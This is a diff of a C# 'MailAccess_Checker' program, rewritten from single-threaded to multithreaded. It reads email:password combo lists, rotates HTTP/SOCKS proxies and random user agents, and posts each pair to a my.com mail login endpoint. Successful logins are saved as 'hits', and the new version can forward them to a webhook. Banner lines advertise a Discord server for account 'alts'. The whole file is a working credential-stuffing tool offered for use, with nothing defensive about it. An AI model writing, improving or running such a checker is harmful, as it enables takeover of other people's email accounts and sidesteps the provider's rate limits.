@@ -1,135 +1,257 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.IO;
 using System.Linq;
-using Leaf.xNet;
+using System.Text;
+using System.Threading.Tasks;
+using Console = Colorful.Console;
 using System.Drawing;
-using MailAccess_Checker.Utils;
-using HttpRequest = Leaf.xNet.HttpRequest;
+using System.Threading;
+using System.IO;
+using System.Windows.Forms;
+using Leaf.xNet;
 
 namespace MailAccess_Checker
 {
-  internal class Program
-  {
-    static string appName = "buy aeris.wtf";
-    static string appVersion = "1.0.0";
-    static string altsPath = "alts.txt";
-    static string proxiesPath = "proxies.txt";
-    public static int hits, bads = 0;
-    public static string[] combo, proxy, test;
-    public static List<string> hitsSaved = new List<string>();
-    public static bool debug = false;
-
-    public static void Main(string[] args)
+    internal class Program
     {
-      Console.Title = appName;
-      
-      // Check if alts.txt exists
-      if (!File.Exists(altsPath) || new FileInfo(altsPath).Length == 0)
-      {
-        Logger.Warning("Couldn't find " + altsPath + "!");
-        return;
-      }
-      else
-        Logger.Info(altsPath + " has been found.");
+        public static int totalChecked, cpm, hits, bads, errors, threads, comboIndex;
+        public static string proxyType, webhooklink;
+        public static List<string> proxies, combos = new List<string>();
+        public static int Proxytotal, Combototal;
+        public static bool webhook;
 
-      // Check if proxies.txt exists
-      if (!File.Exists(proxiesPath) || new FileInfo(proxiesPath).Length == 0)
-      {
-        Logger.Warning("Couldn't find " + proxiesPath + "!");
-        return;
-      }
-      else
-        Logger.Info(proxiesPath + " has been found.");
-      
-      combo = File.ReadAllText(altsPath).Split(new[] {Environment.NewLine}, StringSplitOptions.None);
-      proxy = File.ReadAllText(proxiesPath).Split(new[] {Environment.NewLine}, StringSplitOptions.None);
-
-      // Select proxy type
-      Logger.Question("Proxies type (Socks4, Socks4a, HTTP, HTTPs): ");
-      string proxyType = Console.ReadLine();
-
-      // ----------------------------------------------------------------//
-      
-      Console.Clear();
-      Logger.Info("Starting checker!");
-      
-      // Loop the code for X number times (x = number of lines of alts.txt)
-      for (int i = 0; i < combo.Length; i++)
-      {
-        try
+        public static void Main(string[] args)
         {
-          Console.Title = appName + " ~ Loaded: " + combo.Length + "~ Left: " + (combo.Length - (bads + hits)) + " - Hits: " + hits + " - Bads: " + bads;
+            #region startup
+            Utils.print("Select Combo", "");
+            ComboLoad();
 
-          // Split the account
-          string[] rawAccount = combo.ElementAt<String>(i).Split(':');
-          // Get the proxy
-          string proxies = proxy.ElementAt<String>(new Random().Next(proxy.Length));
-          // Get the account email/username
-          string username = rawAccount[0];
-          // Get the account password
-          string password = rawAccount[1];
 
-          using (HttpRequest httpRequest = new HttpRequest())
-          {
-            // Proxy
-            if (proxyType.Contains("Socks4"))
-              httpRequest.Proxy = Socks4ProxyClient.Parse(proxies);
-            else if (proxyType.Contains("Socks4a"))
-              httpRequest.Proxy = Socks4AProxyClient.Parse(proxies);
-            else if (proxyType.Contains("Socks5"))
-              httpRequest.Proxy = Socks5ProxyClient.Parse(proxies);
-            else if (proxyType.Contains("HTTP") || proxyType.Contains("https"))
-              httpRequest.Proxy = HttpProxyClient.Parse(proxies);
-            
-            // Request stuff
-            httpRequest.IgnoreProtocolErrors = true;
-            httpRequest.ConnectTimeout = 50 * 1000;
-            httpRequest.AllowAutoRedirect = true;
-            httpRequest.KeepAlive = true;
+            Utils.print("Select Proxylist", "");
+            ProxyLoad();
 
-            string request = httpRequest.Post("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + username + "&Password=" + password).ToString();
-            
-            Logger.Debug(request);
-
-            if (request.Contains("Ok=1"))
+            for (; ; )
             {
-              hits++;
-              Logger.Hit(username + ":" + password);
-              hitsSaved.Add(username + ":" + password);
+                Utils.print("Select Proxy Type", "\n");
+                Utils.print("1", "HTTP\n");
+                Utils.print("2", "SOCKS4\n");
+                Utils.print("3", "SOCKS5\n");
+                Utils.print(">", "");
+                var readProxy = System.Console.ReadLine();
+                switch (readProxy)
+                {
+                    case "1":
+                        proxyType = "HTTP";
+                        break;
+
+                    case "2":
+                        proxyType = "SOCKS4";
+                        break;
+
+                    case "3":
+                        proxyType = "SOCKS5";
+                        break;
+                    default:
+                        continue;
+                }
+                break;
             }
-            else
+
+            Utils.print("How many threads do you want to use", "\n");
+            Utils.print(">", "");
+            bool validInput = false;
+            while (!validInput)
             {
-              bads++;
+                try
+                {
+                    threads = Convert.ToInt32(System.Console.ReadLine());
+                    validInput = true;
+                }
+                catch
+                {
+                    Utils.print("Error! Input a number", "");
+                    Console.Write("    [", Color.White);
+                    Console.Write("Error! Input a number", Color.Red);
+                    Console.Write("]\n", Color.White);
+                }
             }
-          }
+
+            Utils.print("Do you want to use webhook? (Y/N | default: No)", "\n");
+            Utils.print(">", "");
+            var webhookquestion = System.Console.ReadLine();
+            switch (webhookquestion)
+            {
+                case "Y":
+                    Utils.print("Webhook link:", "\n");
+                    Utils.print(">", "");
+                    webhook = true;
+                    webhooklink = System.Console.ReadLine();
+                    break;
+                case "N":
+                    webhook = false;
+                    break;
+                default:
+                    webhook = false;
+                    break;
+            }
+
+            #endregion
+            #region start
+
+            Utils.Initialize();
+            var num = 0;
+            while (num <= threads)
+            {
+                new Thread(new ThreadStart(check)).Start();
+                num = num + 1;
+            }
+
+            Task.Factory.StartNew(delegate { UpdateConsole(); });
+            Console.ReadLine();
+            #endregion
         }
-        catch (Exception e)
+        public static void UpdateConsole()
         {
-          Console.WriteLine(e.ToString());
+            var lastChecks = totalChecked;
+            for (; ; )
+            {
+                cpm = totalChecked - lastChecks;
+                lastChecks = totalChecked;
+                Console.Clear();
+                Console.WriteLine("");
+                Console.WriteLine("");
+                Console.WriteLine("");
+                Console.Write("    [", Color.White);
+                Console.Write("HITS", Color.LimeGreen);
+                Console.Write($"] {hits}\n", Color.White);
+                Console.Write("    [", Color.White);
+                Console.Write("BADS", Color.Red);
+                Console.Write($"] {bads}\n", Color.White);
+                Console.Write("    [", Color.White);
+                Console.Write("ERRORS", Color.DarkOrange);
+                Console.Write($"] {Program.errors}\n", Color.White);
+                Console.Write("    [", Color.White);
+                Console.Write("TOTAL", Color.Aquamarine);
+                Console.Write($"] {totalChecked}\n", Color.White);
+                Console.Write("    [", Color.White);
+                Console.Write("CPM", Color.RoyalBlue);
+                Console.Write($"] {Program.cpm * 60}\n\n", Color.White);
+                Console.Write("    [", Color.White);
+                Console.Write("INFO", Color.Green);
+                Console.Write("] discord.gg/DiogoAlts \n", Color.White);
+
+                Console.Title = "DiogoBase - Hits: " + hits + " | Bads: " + bads + " | Errors: " + errors + " CPM: " + cpm;
+
+                Thread.Sleep(1000);
+            }
         }
-      }
-      
-      // Print ending informations
-      Logger.Info("Checker has ended!");
 
-      Console.Write("[ \u2713 ] ", Color.HotPink);
-      Console.Write("Hits: ", Color.Gray);
-      Console.WriteLine($"{hits}", Color.HotPink);
+        public static void check()
+        {
+		    while(Thread.CurrentThread.IsAlive) {
+	                using (var req = new HttpRequest())
+	                {
+	                    try
+	                    {
+	                        string proxy = proxies.ElementAt<string>(new Random().Next(proxies.Count));
+	                        var array = combos[comboIndex].Split(':', ';', '|');
+	                        Interlocked.Increment(ref comboIndex);
+	                        totalChecked++;
 
-      Console.Write("[ X ] ", Color.HotPink);
-      Console.Write("Bads: ", Color.Gray);
-      Console.WriteLine($"{hits}", Color.HotPink);
+	                        switch (proxyType)
+	                        {
+	                            case "HTTP":
+	                                req.Proxy = HttpProxyClient.Parse(proxy);
+	                                req.Proxy.ConnectTimeout = 5000;
+	                                break;
+	                            case "SOCKS4":
+	                                req.Proxy = Socks4ProxyClient.Parse(proxy);
+	                                req.Proxy.ConnectTimeout = 5000;
+	                                break;
+	                            case "SOCKS5":
+	                                req.Proxy = Socks5ProxyClient.Parse(proxy);
+	                                req.Proxy.ConnectTimeout = 5000;
+	                                break;
+	                        }
 
-      string date = String.Format("{1}_{0:yyyy-MM-dd-HH-mm-ss}", DateTime.Now, "results");
-      TextWriter tw = new StreamWriter(date + ".txt");
-      foreach (String s in hitsSaved)
-        tw.WriteLine(s);
-      tw.Close();
+	                        req.UserAgent = Http.RandomUserAgent();
 
-      Logger.Info("Saved the hits to " + date + ".txt!");
-      Logger.Info("We recommend using 'aj-https.my.com' to login on emails. (Goodluck using it)");
-      Console.ReadLine();
+	                        string request = req.Post("https://aj-https.my.com/cgi-bin/auth?ajax_call=1&mmp=mail&simple=1&Login=" + array[0] + "&Password=" + array[1]).ToString();
+
+	                        if (request.Contains("Ok=1"))
+	                        {
+	                            // Hit
+	                            hits++;
+	                            Utils.AsResult("/MailAcess", array[0] + ":" + array[1]);
+	                            if (webhook)
+	                                Utils.sendTowebhook(array[0] + ":" + array[1], "MailAcess");
+	                        }
+	                        else
+	                            bads++;
+
+	                    }
+	                    catch (Exception ex)
+	                    {
+	                        errors++;
+	                    }
+	                }
+	            }
+	        }
+        }
+
+        public static void ComboLoad()
+        {
+            string fileName;
+            var x = new Thread(() =>
+            {
+                var openFileDialog = new OpenFileDialog();
+                do
+                {
+                    openFileDialog.Title = "Select Combo List";
+                    openFileDialog.DefaultExt = "txt";
+                    openFileDialog.Filter = "Text files|*.txt";
+                    openFileDialog.RestoreDirectory = true;
+                    openFileDialog.ShowDialog();
+                    fileName = openFileDialog.FileName;
+                } while (!File.Exists(fileName));
+
+                combos = new List<string>(File.ReadAllLines(fileName));
+                Combototal = combos.Count();
+                Console.Write("Selected ", Color.White);
+                Console.Write(Proxytotal, Color.Purple);
+                Console.Write(" Proxies\n\n", Color.White);
+            });
+            x.SetApartmentState(ApartmentState.STA);
+            x.Start();
+            x.Join();
+        }
+
+
+        public static void ProxyLoad()
+        {
+            string fileName;
+            var x = new Thread(() =>
+            {
+                var openFileDialog = new OpenFileDialog();
+                do
+                {
+                    openFileDialog.Title = "Select Proxy List";
+                    openFileDialog.DefaultExt = "txt";
+                    openFileDialog.Filter = "Text files|*.txt";
+                    openFileDialog.RestoreDirectory = true;
+                    openFileDialog.ShowDialog();
+                    fileName = openFileDialog.FileName;
+                } while (!File.Exists(fileName));
+
+                proxies = new List<string>(File.ReadAllLines(fileName));
+                Proxytotal = proxies.Count();
+                Console.Write("Selected ", Color.White);
+                Console.Write(Proxytotal, Color.Purple);
+                Console.Write(" Proxies\n\n", Color.White);
+            });
+            x.SetApartmentState(ApartmentState.STA);
+            x.Start();
+            x.Join();
+        }
     }
-  }
 }
